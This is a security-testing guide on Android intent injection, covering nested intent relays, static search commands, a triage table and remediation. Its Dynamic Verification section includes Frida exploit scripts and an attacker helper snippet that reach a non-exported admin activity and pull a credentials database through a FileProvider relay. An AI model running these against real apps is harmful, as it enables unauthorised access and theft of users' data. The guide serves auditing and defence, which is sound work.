# Intent Injection & Nested Intent Redirection

Focused guide for Android intent relay flaws where an exported component acts as a confused deputy and forwards attacker-controlled data to internal components, `FileProvider` URIs, broadcasts, or services.

## Overview

Intent injection is not the same as classic implicit intent hijacking. The high-value case is usually:

1. attacker reaches an exported entry point;
2. the app extracts a nested `Intent`, `Uri`, or grant flags from untrusted input;
3. the app forwards that object with its own privileges.

This still matters on Android 14+ even though implicit intent abuse is harder. Explicit component targeting and nested intent relays can remain exploitable.

> **Related references**:
> - `pendingintent-security.md` for mutable `PendingIntent` abuse
> - `android-14-15-security-changes.md` for API 34+ intent restrictions
> - `attack-patterns.md` for source-to-sink tracing rules

---

## Root Cause Patterns

### 1. Nested `Intent` relay

```java
public class ProxyActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent nestedIntent = getIntent().getParcelableExtra("target_intent");
        if (nestedIntent != null) {
            startActivity(nestedIntent);
        }
    }
}
```

### 2. Service / broadcast relay

```java
Intent forwarded = getIntent().getParcelableExtra("next");
startService(forwarded);
sendBroadcast(forwarded);
```

### 3. URI grant pivot

```java
Intent share = getIntent().getParcelableExtra("share_intent");
share.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
startActivity(share);
```

### 4. Result redirection

```java
Intent result = getIntent().getParcelableExtra("result_intent");
setResult(Activity.RESULT_OK, result);
finish();
```

---

## High-Value Attack Paths

### Access private activities or services
- exported proxy receives attacker-controlled nested `Intent`
- app launches non-exported component internally
- attacker reaches debug/admin/auth flows not meant to be public

### Exfiltrate files via `FileProvider`
- attacker influences `data`, `ClipData`, or grant flags
- app forwards `content://` URI with `FLAG_GRANT_READ_URI_PERMISSION`
- attacker receives victim-owned data through the app's trust boundary

### Abuse privileged broadcasts or services
- attacker-controlled relay reaches a receiver/service protected by app identity
- useful for account actions, token refresh, or privileged workflows

### Amplify impact with `PendingIntent`
- mutable or weakly validated `PendingIntent` can become the delivery primitive
- see `pendingintent-security.md` for full mutation and provenance guidance

---

## Static Analysis Workflow

### 1. Manifest pivots

Review exported entry points first:

```bash
rg -n 'android:exported="true"|BROWSABLE|grantUriPermissions' decoded/AndroidManifest.xml
rg -n 'FileProvider|androidx.core.content.FileProvider' decoded/AndroidManifest.xml decoded/res/xml
```

Focus on:
- exported `Activity`, `Service`, `Receiver`
- deep link / `BROWSABLE` handlers
- `FileProvider` authorities and path XML
- components that call internal flows after parsing extras

### 2. Search for relay primitives

Use scoped searches inside the app namespace only.

```bash
rg -n 'getParcelableExtra|getSerializableExtra|getBundleExtra|getIntent\(\)' jadx-output/sources
rg -n 'startActivity\(|startService\(|startForegroundService\(|bindService\(|sendBroadcast\(|setResult\(' jadx-output/sources
rg -n 'FLAG_GRANT_(READ|WRITE)_URI_PERMISSION|setClipData|setDataAndType|getUriForFile|FileProvider' jadx-output/sources decoded
```

### 3. Smali fallback

When JADX is incomplete or obfuscated:

```bash
rg -n 'getParcelableExtra|startActivity|startService|sendBroadcast|FLAG_GRANT_READ_URI_PERMISSION' decoded/smali*
rg -n 'Landroid/content/Intent;->|Landroidx/core/content/FileProvider;->' decoded/smali*
```

### 4. Trace the full chain

Do not stop at the grep hit. Confirm:

1. **Entry point is reachable** from another app or deep link
2. **Attacker controls** the nested object, URI, or flags
3. **App forwards** it to `startActivity`, `startService`, `sendBroadcast`, `setResult`, or `grantUriPermission`
4. **Target component/resource** gains new reachability or privileges
5. **Validation exists or not**

---

## Confidence Decision Tree

| Question | If yes | If no |
|---|---|---|
| Is the entry point exported or externally reachable? | Continue | Usually discard |
| Is a nested `Intent`, `Uri`, `ClipData`, or grant flag attacker-controlled? | Continue | Lower confidence |
| Does the app forward it to an IPC sink? | Continue | Keep tracing |
| Does the app rebuild a new explicit safe intent instead of forwarding? | Often discard | Continue |
| Does validation restrict package, class, action, data, and flags? | Review bypassability | Report |

### Usually report as **Confirmed**
- exported component extracts nested `Intent`
- attacker-controlled relay reaches `startActivity` / `startService` / `sendBroadcast`
- no allowlist or sanitization

### Usually report as **Needs Dynamic Confirmation**
- target component is resolved through reflection
- grant behavior depends on runtime state
- file access crosses native or provider-specific logic

---

## FileProvider & URI Grant Checklist

When a relay touches `content://` data, verify all of:

- `FLAG_GRANT_READ_URI_PERMISSION`
- `FLAG_GRANT_WRITE_URI_PERMISSION`
- `setClipData(...)`
- `grantUriPermission(...)`
- `setData(...)` / `setDataAndType(...)`
- `FileProvider.getUriForFile(...)`
- `content://<authority>/...`

High-risk signs:
- forwarded URI is not rebuilt or canonicalized
- grant flags come directly from inbound intent
- provider exposes broad paths
- result intent returns provider data to caller

---

## Dynamic Verification

### Fast runtime visibility

Use the bundled logger first:

```bash
frida -U -f com.target.app \
  -l assets/frida-scripts/intent-logger.js \
 
```

### Frida Exploitation Scripts for Intent Injection

Use these scripts when you have confirmed a vulnerable relay pattern and need to demonstrate exploitation dynamically.

#### Hook exported Activity entry points

```javascript
Java.perform(function() {
    var proxyActivity = Java.use('com.target.app.ProxyActivity');
    
    // Hook the vulnerable method that forwards nested intent
    proxyActivity.onCreate.overload('android.os.Bundle').implementation = function(bundle) {
        console.log('[+] ProxyActivity.onCreate called');
        
        // Log the incoming intent extras
        var incoming = this.getIntent();
        if (incoming) {
            console.log('[+] Incoming action: ' + incoming.getAction());
            console.log('[+] Incoming data: ' + incoming.getData());
            // Check for nested intent extra
            var nested = incoming.getParcelableExtra('target_intent');
            if (nested) {
                console.log('[!] Nested intent detected: ' + nested);
                console.log('[!] Nested component: ' + nested.getComponent());
                console.log('[!] Nested flags: ' + nested.getFlags());
            }
        }
        
        // Continue original execution
        this.onCreate(bundle);
    };
});
```

#### Exploit: Launch non-exported Activity via nested Intent

```javascript
Java.perform(function() {
    // Create the malicious nested intent targeting non-exported activity
    var maliciousIntent = Java.use('android.content.Intent').$new();
    maliciousIntent.setClassName('com.target.app', 'com.target.app.AdminSettings');
    
    // Create wrapper intent targeting the exported proxy
    var proxyIntent = Java.use('android.content.Intent').$new();
    proxyIntent.setClassName('com.target.app', 'com.target.app.ProxyActivity');
    proxyIntent.putParcelableExtra('target_intent', maliciousIntent);
    
    // Set grant flags (these may be stripped or forwarded)
    maliciousIntent.setFlags(0x00000001 | 0x00000002); // READ + WRITE URI
    
    console.log('[+] Launching malicious nested intent...');
    
    // Start the activity
    Java.use('android.app.Activity').startActivity(proxyIntent);
    console.log('[+] Intent sent successfully');
});
```

#### Exploit: FileProvider data exfiltration via nested Intent

```javascript
Java.perform(function() {
    // Target a sensitive file within the victim app's sandbox
    var sensitiveFileUri = 'content://com.target.provider/root/data/data/com.target.app/databases/user_creds.db';
    
    // Create malicious intent with URI grant
    var maliciousIntent = Java.use('android.content.Intent').$new();
    maliciousIntent.setData(Java.use('android.net.Uri').parse(sensitiveFileUri));
    maliciousIntent.setFlags(0x00000001); // FLAG_GRANT_READ_URI_PERMISSION
    
    // Wrap in proxy intent
    var proxyIntent = Java.use('android.content.Intent').$new();
    proxyIntent.setClassName('com.target.app', 'com.target.app.ProxyActivity');
    proxyIntent.putParcelableExtra('next_intent', maliciousIntent);
    
    console.log('[+] Attempting file exfiltration via FileProvider relay...');
    Java.use('android.app.Activity').startActivity(proxyIntent);
});
```

#### Monitor all Parcelable extras across the app

```javascript
Java.perform(function() {
    // Hook all Activity implementations to catch Intent extra patterns
    Java.enumerateLoadedClasses({
        onMatch: function(className) {
            if (className.indexOf('Activity') >= 0) {
                try {
                    var cls = Java.use(className);
                    if (cls.onCreate && cls.onCreate.implementation === undefined) {
                        cls.onCreate.overload('android.os.Bundle').implementation = function(b) {
                            var intent = this.getIntent();
                            if (intent) {
                                var extras = intent.getExtras();
                                if (extras) {
                                    console.log('[+] ' + className + ' onCreate - checking extras...');
                                    for (var key of extras.keySet()) {
                                        var val = extras.get(key);
                                        if (val && val.getClass && val.getClass().getName().indexOf('Parcel') >= 0) {
                                            console.log('[!] Parcelable extra found: ' + key + ' = ' + val);
                                        }
                                    }
                                }
                            }
                            this.onCreate(b);
                        };
                    }
                } catch(e) {}
            }
        },
        onComplete: function() {}
    });
});
```

**Source:** [blogs.jsmon.sh - What is Intent Injection? Android Exploit Guide](https://blogs.jsmon.sh/what-is-intent-injection-android-ways-to-exploit-examples-and-impact/)

---

Then trigger the exported component explicitly:

```bash
adb shell am start -n com.target.app/.ProxyActivity \
  --es debug "1"
```

### Why ADB alone is not always enough

ADB is great for exported entry points, but nested `Intent` objects are awkward to serialize from the CLI. For reliable confirmation, prefer:

1. a tiny helper APK that sends crafted nested intents;
2. Drozer for IPC exploration;
3. Frida hooks that log `getParcelableExtra(...)`, `ClipData`, and forwarded sinks.

### Minimal attacker helper pattern

```java
Intent nested = new Intent();
nested.setClassName("com.victim.app", "com.victim.app.AdminActivity");

Intent wrapper = new Intent();
wrapper.setClassName("com.victim.app", "com.victim.app.ProxyActivity");
wrapper.putExtra("target_intent", nested);

startActivity(wrapper);
```

### Frida probe for nested relays

```javascript
Java.perform(function() {
    var Activity = Java.use("android.app.Activity");
    Activity.startActivity.overload("android.content.Intent").implementation = function(intent) {
        console.log("[*] startActivity relay -> " + intent);
        return this.startActivity(intent);
    };
});
```

---

## Remediation Patterns

### Reject direct forwarding

Bad:

```java
startActivity(nestedIntent);
```

Better:

```java
Intent safe = new Intent(this, SafeActivity.class);
safe.putExtra("id", validatedId);
startActivity(safe);
```

### Validate every dimension

If nested intents are unavoidable, validate:
- destination package
- destination class
- allowed action
- allowed URI scheme / authority / path
- forbidden flags (`FLAG_GRANT_*`)
- `ClipData` presence

### Strip grant flags and clip data

```java
nestedIntent.setFlags(nestedIntent.getFlags() &
    ~(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION));
nestedIntent.setClipData(null);
```

### Harden related `PendingIntent` usage

If the flow uses `PendingIntent`, default to:

```java
PendingIntent.FLAG_IMMUTABLE
```

See `pendingintent-security.md` for edge cases where mutability is unavoidable.

---

## Reporting Notes

Good findings usually explain:

1. exported entry point
2. attacker-controlled nested object
3. relay sink
4. reachable internal component or protected data
5. concrete impact: private activity access, file exfiltration, privilege escalation, or confused deputy behavior

Prefer explicit language such as:
- "Validate nested intents against an allowlist before forwarding"
- "Rebuild a new explicit intent instead of relaying attacker-controlled extras"
- "Strip URI grant flags from externally supplied intents"
